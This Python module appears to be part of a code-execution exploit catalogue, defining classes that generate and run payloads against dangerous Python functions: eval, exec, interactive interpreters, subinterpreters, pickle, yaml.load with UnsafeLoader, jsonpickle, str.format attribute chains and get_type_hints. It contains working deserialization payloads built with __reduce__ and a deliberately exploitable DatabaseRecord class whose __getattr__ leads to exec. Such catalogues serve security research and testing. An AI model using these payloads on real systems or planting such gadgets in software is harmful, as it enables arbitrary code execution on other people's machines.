import builtins
import base64
import jsonpickle
import pickle
import subprocess
import typing
from pathlib import Path
from typing import Callable, List, get_type_hints
import importlib
import tempfile
import yaml
import textwrap
import code
from test import support
import _testcapi
import _xxsubinterpreters

from .execution_base import Exploit


class PythonExploit(Exploit):
    pass

class SimplePythonExploit(PythonExploit):
    category_name = "Simple Python Code Execution"

    def generate_payload(source_code: str) -> str:
        return source_code


class InterpreterRunSourceExploit(SimplePythonExploit):
    vulnerable_function = code.InteractiveInterpreter.runsource

    def run_payload(payload: str) -> None:
        inperpreter = code.InteractiveInterpreter()
        inperpreter.runsource(payload)


class InterpreterRunCodeExploit(SimplePythonExploit):
    vulnerable_function = code.InteractiveInterpreter.runcode

    def run_payload(payload: str) -> None:
        inperpreter = code.InteractiveInterpreter()
        inperpreter.runcode(code.compile_command(payload))


class ConsolePushExploit(SimplePythonExploit):
    vulnerable_function = code.InteractiveConsole.push

    def run_payload(payload: str) -> None:
        console = code.InteractiveConsole()
        console.push(payload)


class TestSubinterpreterExploit(SimplePythonExploit):
    vulnerable_function = support.run_in_subinterp

    def run_payload(payload: str) -> None:
        support.run_in_subinterp(payload)


class TestCAPISubinterpreterExploit(SimplePythonExploit):
    vulnerable_function = _testcapi.run_in_subinterp

    def run_payload(payload: str) -> None:
        _testcapi.run_in_subinterp(payload)


class XXSubinterpreterExploit(SimplePythonExploit):
    vulnerable_function = _xxsubinterpreters.run_string

    def run_payload(payload: str) -> None:
        _xxsubinterpreters.run_string(_xxsubinterpreters.create(), payload)


class EvalExploit(SimplePythonExploit):
    vulnerable_function = builtins.eval

    def run_payload(payload: str) -> None:
        eval(payload)


class ExecExploit(SimplePythonExploit):
    vulnerable_function = builtins.exec

    def run_payload(payload: str) -> None:
        exec(payload)


class InputExploit(SimplePythonExploit):
    vulnerable_function = builtins.input

    notes = "'input' is only vulnerable in Python 2"


    def generate_payload(source_code: str) -> str:
        return f"__import__('code').InteractiveInterpreter().runsource('''{source_code}''')"


    def run_payload(payload: str) -> None:
        with tempfile.TemporaryDirectory() as directory:
            python_file = Path(directory) / "hello_world.py"
            python_file.write_text(textwrap.dedent("""
                print("What is your name?")
                name = input()
                print("Hello " + name)
            """))
            program = subprocess.Popen(['python2', str(python_file)], stdin=subprocess.PIPE, text=True)
            program.communicate(input=payload, timeout=1)


class SimpleVMExploit(SimplePythonExploit):
    vulnerable_function = "object.__call__"

    def generate_payload(source_code: str) -> List[str]:
        return ["builtins.eval", source_code]

    def run_payload(fully_qualified_function: str, argument: str) -> None:
        module_name, _, function_name = fully_qualified_function.rpartition(".")
        module = importlib.import_module(module_name)
        function = getattr(module, function_name)
        function(argument)


class PickleLoadsExploit(SimplePythonExploit):
    vulnerable_function = pickle.loads
    source = (
        "https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html"
    )

    def generate_payload(source_code: str) -> str:
        class Exploit(object):
            def __reduce__(self):
                return (eval, (source_code,))

        return base64.b64encode(pickle.dumps(Exploit()))

    def run_payload(payload: str) -> None:
        payload = base64.b64decode(payload)
        obj = pickle.loads(payload)


class YamlLoadsExploit(SimplePythonExploit):
    vulnerable_function = yaml.load
    source = (
        "https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html"
    )
    notes = (
        "'load' without an explicit loader has been deperecated since 2020, "
        + "and now requires 'UnsafeLoader' for the exploit to work: "
        + "https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation"
    )

    def generate_payload(source_code: str) -> str:
        class Exploit(object):
            def __reduce__(self):
                return (eval, (source_code,))

        return yaml.dump(Exploit())

    def run_payload(payload: str) -> None:
        yaml.load(payload, Loader=yaml.UnsafeLoader)


class JSONPickleLoadsExploit(SimplePythonExploit):
    vulnerable_function = pickle.loads
    source = (
        "https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html"
    )

    def generate_payload(source_code: str) -> str:
        class Exploit(object):
            def __reduce__(self):
                return (eval, (source_code,))

        return jsonpickle.encode(Exploit())

    def run_payload(payload: str) -> None:
        obj = jsonpickle.decode(payload)


class StringFormatExploit(SimplePythonExploit):
    vulnerable_function = "str.format"

    def generate_payload(source_code: str) -> str:
        encoded_source_code = "".join(["\\" + hex(ord(c))[1:] for c in source_code])
        return f"{{event.__init__.__globals__[record].exec(b'{encoded_source_code}')_send_command}}"

    def run_payload(payload: str) -> None:
        """Note that this exploit is enabled by the following code at the global scope:
        class DatabaseRecord:
            def cached(self, attribute):
                pass

            def from_database(self, attribute):
                pass

            def send_command(self, command):
                exec(command)

            def __getattr__(self, key):
                print(key)
                attr_name, state = key.split("_", 1)
                return getattr(self, state)(attr_name)

        record = DatabaseRecord()
        """

        class SomeObject(object):
            def __init__(self, value):
                self.value = value

        payload.format(event=SomeObject(1))


class DatabaseRecord:
    def cached(self, attribute):
        pass

    def from_database(self, attribute):
        pass

    def send_command(self, command):
        exec(command)

    def __getattr__(self, key):
        print(key)
        attr_name, state = key.split("_", 1)
        return getattr(self, state)(attr_name)


record = DatabaseRecord()


class TypeHintExploit(SimplePythonExploit):
    vulnerable_function = typing.get_type_hints

    def run_payload(payload: str) -> None:
        class C:
            member: int = 0

        C.__annotations__["member"] = payload

        get_type_hints(C)
